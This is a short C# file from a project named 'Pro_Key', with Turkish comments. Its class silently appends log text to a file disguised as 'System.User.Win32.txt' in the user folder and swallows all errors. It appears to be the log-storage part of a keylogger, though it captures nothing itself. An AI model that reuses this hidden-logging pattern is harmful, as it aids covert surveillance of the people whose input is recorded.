using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;

namespace Pro_Key
{
    class filerw
    {
        public void dosyayazdiroku(string log)
        {
            string dosya_adi = "System.User.Win32.txt";
            string dosya_yolu = @"C:\Users\User";
            string hedef_yolu = System.IO.Path.Combine(dosya_yolu, dosya_adi);//dosya yoluyla adını kombinliyorum birlestiriyorum.

            try
            {

                if (System.IO.File.Exists(hedef_yolu))//Dosya mevcutsa
                {
                    //MessageBox.Show("Dosya Mevcut");
                    //string log = "\n"+"loglarım";
                    System.IO.File.AppendAllText(hedef_yolu, "\n" + log);//bir alt satıra geçip yazdırıyorum.çünkü ilk olarak olusturmussam tek satır vardır 

                    //MessageBox.Show(log);

                    //using (StreamWriter srwriter = new StreamWriter(hedef_yolu))
                    //{
                    ////    string log = "loglarım";
                    //    srwriter.Write(log);
                    //}
                    //string[] satirlar = { "bb1aa", "2dddcc", "3cc" };
                    //System.IO.File.WriteAllLines(hedef_yolu, satirlar);
                    //System.IO.File.AppendAllText(hedef_yolu, log);

                    //string[] satirlar = System.IO.File.ReadAllLines(hedef_yolu, Encoding.GetEncoding("windows-1254"));
                    //foreach (string item in satirlar)//dizinin eleman sayıısı kadar dönecek//text dosyası kaç satırdan olusuyorsa
                    //{
                    //    MessageBox.Show(item);
                    //}
                    //MessageBox.Show(satirlar[0]);
                    //string metin = System.IO.File.ReadAllText(hedef_yolu, Encoding.GetEncoding("windows-1254"));//bÜTÜN METNİ türkce okumak için dosyanın içindekileri
                    //MessageBox.Show(metin);
                }
                else
                {
                    System.IO.File.Create(hedef_yolu).Close();                   //MessageBox.Show("Dosya Oluşturuldu");
                    System.IO.File.WriteAllText(hedef_yolu, log);
                }

            }
            catch { }




        }
    }
}
